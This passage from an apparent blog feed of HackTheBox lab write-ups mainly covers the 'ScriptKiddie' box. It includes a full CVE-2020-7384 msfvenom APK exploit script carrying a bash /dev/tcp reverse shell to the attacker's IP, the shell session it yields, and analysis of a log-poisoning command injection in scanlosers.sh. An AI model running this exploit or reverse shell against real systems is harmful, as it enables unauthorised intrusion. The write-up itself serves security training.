</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service DCLl on 10.10.10.237.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service DCLl.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami <span class="o">&amp;&amp;</span> hostname
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">ATOM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf
</span></span><span class="line"><span class="cl">   Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.237
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - ScriptKiddie</title>
      <link>https://fahmifj.github.io/hackthebox/scriptkiddie/</link>
      <pubDate>Mon, 14 Jun 2021 07:57:37 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/scriptkiddie/</guid>
      <description>Exploiting exploitation tools and command injection in a log file</description>
      <content:encoded><![CDATA[<p>ScriptKiddie is all about exploiting exploitation tools. It starts by exploiting <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384">CVE-2020-7384</a>, allows me to gain a foothold by crafting a malicious APK that executes a reverse shell when used as APK template on <code>msfvenom</code>. There is a script which automatically runs a <code>nmap</code> scan against a host from a log file. The script can be exploited by poisoning the log with a reverse shell. For the last part, a sudo privilege on <code>msfconsole</code>  can be leveraged to gain a root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploiting Metasploit CVE-2020-7384</li>
<li>Log poisoning</li>
<li>Sudo exploitation on msfconsole</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">CVE-2020-7384 PoC</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full port scan with <code>nmap</code> discovers two open ports: SSH on port 22, and UPnP on port 5000</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.10.226 
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-13 20:42 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.226
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.065s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65533</span> resets
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">5000/tcp open  upnp    syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 45.79 seconds
</span></span></code></pre></div><p>With default script scan, <code>nmap</code> identifies that port 5000 is actually a web application hosted using Python.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nmap -p22,5000 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.226
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-13 20:44 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.226
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.056s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">5000/tcp open  http    Werkzeug httpd 0.16.1 <span class="o">(</span>Python 3.8.5<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Werkzeug/0.16.1 Python/3.8.5
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: k1d<span class="err">&#39;</span><span class="m">5</span> h4ck3r t00l5
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.66 second
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-5000---website">TCP 5000 - Website</h3>
<p>The site provides several online hacking tools.</p>
<p><div class="img-container"><img src="imgs/image-20210614081410024.png" alt="image-20210614081410024"  /></div>
</p>
<p>The <code>nmap</code> tool can be used to scan against itself.</p>
<p><div class="img-container"><img src="imgs/image-20210614081542603.png" alt="image-20210614081542603"  /></div>
</p>
<p>The IP field doesn&rsquo;t accept others inputs except IPv4, so I don&rsquo;t thing it can be abused, but I&rsquo;ll note the <code>nmap</code> version.</p>
<p>The next tool is <code>msfvenom</code>, it can be used to generate a reverse shell binary.  It has three options on the OS: Windows, Linux and Android. There is also a template option, for example, you can embed your payload to Windows&rsquo;s <code>calc.exe</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210614082411239.png" alt="image-20210614082411239"  /></div>
</p>
<p>Somehow, it can only generate payload for Windows and Android.</p>
<p><div class="img-container"><img src="imgs/image-20210614082153746.png" alt="image-20210614082153746"  /></div>
</p>
<p>The payload is available for 5 mins at <code>http://10.10.10.226:5000/static/payloads/[here]</code>.</p>
<p>The last tool is <code>searchsploit</code>, I tried to stack the commands but it returned this message.</p>
<p><div class="img-container"><img src="imgs/image-20210614083303308.png" alt="image-20210614083303308"  /></div>
</p>
<h3 id="finding-tools-vulnerabilities">Finding Tools Vulnerabilities</h3>
<p>I can&rsquo;t get the tools version except for <code>nmap</code>, so I searched some exploits around before the box release date (February 2021) on Exploit-DB  and here is what I found.</p>
<p><div class="img-container"><img src="imgs/image-20210614084800963.png" alt="image-20210614084800963"  /></div>
</p>
<p>And that is probably what I need.</p>
<p>I typed &ldquo;msfvenom&rdquo; on the site too, and the exploit also appeared there.</p>
<p><div class="img-container"><img src="imgs/image-20210614085320477.png" alt="image-20210614085320477"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-kid">Shell as kid</h3>
<h4 id="mfvenom-cve-2020-7384">Mfvenom CVE-2020-7384</h4>
<p>I&rsquo;ll use <a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">this exploit</a>, but I&rsquo;ll change the payload and the template location to my current working directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tempfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b32encode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Change me</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># b32encode to avoid badchars (keytool is picky)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># thanks to @fdellwing for noticing that base64 can sometimes break keytool</span>
</span></span><span class="line"><span class="cl"><span class="c1"># &lt;https://github.com/justinsteven/advisories/issues/2&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload_b32</span> <span class="o">=</span> <span class="n">b32encode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">dname</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;CN=&#39;|echo </span><span class="si">{</span><span class="n">payload_b32</span><span class="si">}</span><span class="s2"> | base32 -d | sh #&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Manufacturing evil apkfile&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;-dname: </span><span class="si">{</span><span class="n">dname</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tmpdir</span> <span class="o">=</span> <span class="s2">&#34;./&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">apk_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;evil.apk&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">empty_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;empty&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">keystore_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;signing.keystore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">storepass</span> <span class="o">=</span> <span class="n">keypass</span> <span class="o">=</span> <span class="s2">&#34;password&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">key_alias</span> <span class="o">=</span> <span class="s2">&#34;signing.key&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="n">empty_file</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;zip&#34;</span><span class="p">,</span> <span class="s2">&#34;-j&#34;</span><span class="p">,</span> <span class="n">apk_file</span><span class="p">,</span> <span class="n">empty_file</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;keytool&#34;</span><span class="p">,</span> <span class="s2">&#34;-genkey&#34;</span><span class="p">,</span> <span class="s2">&#34;-keystore&#34;</span><span class="p">,</span> <span class="n">keystore_file</span><span class="p">,</span> <span class="s2">&#34;-alias&#34;</span><span class="p">,</span> <span class="n">key_alias</span><span class="p">,</span> <span class="s2">&#34;-storepass&#34;</span><span class="p">,</span> <span class="n">storepass</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                       <span class="s2">&#34;-keypass&#34;</span><span class="p">,</span> <span class="n">keypass</span><span class="p">,</span> <span class="s2">&#34;-keyalg&#34;</span><span class="p">,</span> <span class="s2">&#34;RSA&#34;</span><span class="p">,</span> <span class="s2">&#34;-keysize&#34;</span><span class="p">,</span> <span class="s2">&#34;2048&#34;</span><span class="p">,</span> <span class="s2">&#34;-dname&#34;</span><span class="p">,</span> <span class="n">dname</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;jarsigner&#34;</span><span class="p">,</span> <span class="s2">&#34;-sigalg&#34;</span><span class="p">,</span> <span class="s2">&#34;SHA1withRSA&#34;</span><span class="p">,</span> <span class="s2">&#34;-digestalg&#34;</span><span class="p">,</span> <span class="s2">&#34;SHA1&#34;</span><span class="p">,</span> <span class="s2">&#34;-keystore&#34;</span><span class="p">,</span> <span class="n">keystore_file</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                       <span class="s2">&#34;-storepass&#34;</span><span class="p">,</span> <span class="n">storepass</span><span class="p">,</span> <span class="s2">&#34;-keypass&#34;</span><span class="p">,</span> <span class="n">keypass</span><span class="p">,</span> <span class="n">apk_file</span><span class="p">,</span> <span class="n">key_alias</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Done! apkfile is at </span><span class="si">{</span><span class="n">apk_file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Do: msfvenom -x </span><span class="si">{</span><span class="n">apk_file</span><span class="si">}</span><span class="s2"> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>It produces a file called <code>evil.apk</code> and it also shows the exploit commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ python3 exploit_msfvenom.py
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Manufacturing evil apkfile
</span></span><span class="line"><span class="cl">Payload: bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;</span>
</span></span><span class="line"><span class="cl">-dname: <span class="nv">CN</span><span class="o">=</span><span class="s1">&#39;|echo MJQXG2BAFVRSAITCMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE2C4MZRF44TAMBQEAYD4JRREI====== | base32 -d | sh #
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">  adding: empty (stored 0%)
</span></span></span><span class="line"><span class="cl"><span class="s1">jar signed.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning:
</span></span></span><span class="line"><span class="cl"><span class="s1">The signer&#39;</span>s certificate is self-signed.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Done! apkfile is at ./evil.apk
</span></span><span class="line"><span class="cl">Do: msfvenom -x ./evil.apk -p android/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o /dev/null
</span></span></code></pre></div><h4 id="reverse-shell---kid">Reverse shell - kid</h4>
<p>I&rsquo;ll setup a <code>nc</code> listener on port 9000, then I&rsquo;ll upload the <code>evil.apk</code> file as the template file and then I&rsquo;ll click on the generate button.</p>
<p><div class="img-container"><img src="imgs/image-20210614103158432.png" alt="image-20210614103158432"  /></div>
</p>
<p>On my listener, I&rsquo;ve a shell now as user <code>kid</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> root@kali «exploits» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">34230</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>897<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$    
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614102941088.png" alt="image-20210614102941088"  /></div>
</p>
<h4 id="shell-upgrade">Shell upgrade</h4>
<p>I&rsquo;ll upgrade my shell first.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ which python
</span></span><span class="line"><span class="cl">which python
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">10652</span> suspended  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">10652</span> continued  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ 
</span></span></code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/html$ <span class="nb">cd</span> ~
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">60</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> kid  kid   <span class="m">807</span> Feb <span class="m">25</span>  <span class="m">2020</span> .profile
</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> kid  kid  <span class="m">4096</span> Feb <span class="m">10</span> 16:11 .ssh
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> kid  kid     <span class="m">0</span> Jan  <span class="m">5</span> 11:10 .sudo_as_admin_successful
</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">5</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 11:03 html
</span></span><span class="line"><span class="cl">drwxrwxrwx  <span class="m">2</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 07:40 logs
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 11:48 snap
</span></span><span class="line"><span class="cl">-r--------  <span class="m">1</span> kid  kid    <span class="m">33</span> Jun <span class="m">12</span> 11:35 user.txt
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-pwn">Shell as pwn</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>On kid&rsquo;s home, there&rsquo;s a folder called <code>logs</code>. The <code>logs</code> folder contains one file called <code>hackers</code>, but the content is empty.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/logs$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxrwxrwx  <span class="m">2</span> kid kid <span class="m">4096</span> Feb  <span class="m">3</span> 07:40 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">11</span> kid kid <span class="m">4096</span> Feb  <span class="m">3</span> 11:49 ..
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> kid pwn    <span class="m">0</span> Jun <span class="m">14</span> 01:40 hackers
</span></span></code></pre></div><p>I did a quick check on the available users who have shells.  It looks like I need to escalate to <code>pwn</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">kid:x:1000:1000:kid:/home/kid:/bin/bash
</span></span><span class="line"><span class="cl">pwn:x:1001:1001::/home/pwn:/bin/bash
</span></span></code></pre></div><p>Searching files owned by user <code>pwn</code> discovers one script called <code>scanlosers.sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ find / -type f -user pwn 2&gt;/dev/null
</span></span><span class="line"><span class="cl">/home/pwn/.bash_logout
</span></span><span class="line"><span class="cl">/home/pwn/.selected_editor
</span></span><span class="line"><span class="cl">/home/pwn/.bashrc
</span></span><span class="line"><span class="cl">/home/pwn/.profile
</span></span><span class="line"><span class="cl">/home/pwn/scanlosers.sh
</span></span></code></pre></div><p>The script is writable by me.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ ls -l /home/pwn/scanlosers.sh
</span></span><span class="line"><span class="cl">-rwxrwxr-- <span class="m">1</span> pwn pwn <span class="m">250</span> Jan <span class="m">28</span> 17:57 /home/pwn/scanlosers.sh
</span></span></code></pre></div><h4 id="script-analysis">Script analysis</h4>
<p>The script is most likely linked with kid&rsquo;s hack tools website and probably can be abused by stacking commands, but I need to find how the log in <code>hackers</code> file is formatted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Define log</span>
</span></span><span class="line"><span class="cl"><span class="nv">log</span><span class="o">=</span>/home/kid/logs/hackers 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/pwn/
</span></span><span class="line"><span class="cl">cat <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> ip<span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    sh -c <span class="s2">&#34;nmap --top-ports 10 -oN recon/</span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2">.nmap </span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2"> 2&gt;&amp;1 &gt;/dev/null&#34;</span> <span class="p">&amp;</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span><span class="line"><span class="cl"><span class="c1">## The log is cleared immediately</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>wc -l &lt; <span class="nv">$log</span><span class="k">)</span> -gt <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> -n &gt; <span class="nv">$log</span><span class="p">;</span> <span class="k">fi</span>
</span></span></code></pre></div><p>Looking at the source code of the hosted web, it turns out that the log record consists of date and IP address. The logging happens when someone trying to insert a malicious input to the kid&rsquo;s hack tools.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">searchsploit</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">srcip</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">regex_alphanum</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;searchsploit&#39;</span><span class="p">,</span> <span class="s1">&#39;--color&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">searchsploit</span><span class="o">=</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="s1">&#39;ignore&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/home/kid/logs/hackers&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[</span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="si">}</span><span class="s1">] </span><span class="si">{</span><span class="n">srcip</span><span class="si">}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">sserror</span><span class="o">=</span><span class="s2">&#34;stop hacking me - well hack you back&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
</span></span></code></pre></div><p>For example, I can trigger an event that logs my IP in the <code>hackers</code> log file by inserting <code>-v apache</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210614114025066.png" alt="image-20210614114025066"  /></div>
</p>
<p>Or I could generate the same log format in one line:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ python3 -c <span class="s2">&#34;from datetime import datetime; print(f&#39;[{datetime.now()}] 127.0.0.1&#39;)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>2021-06-14 00:43:54.924946<span class="o">]</span> 127.0.0.1
</span></span></code></pre></div><p>I could guess that the <code>scanlosers.sh</code> is intended as a &lsquo;counter attack&rsquo;. From here, I know that <code>scanlosers.sh</code> will be <strong>executed automatically</strong>.</p>
<p>To exploit the script, I have to trick this line from <code>scanlosers.sh</code></p>
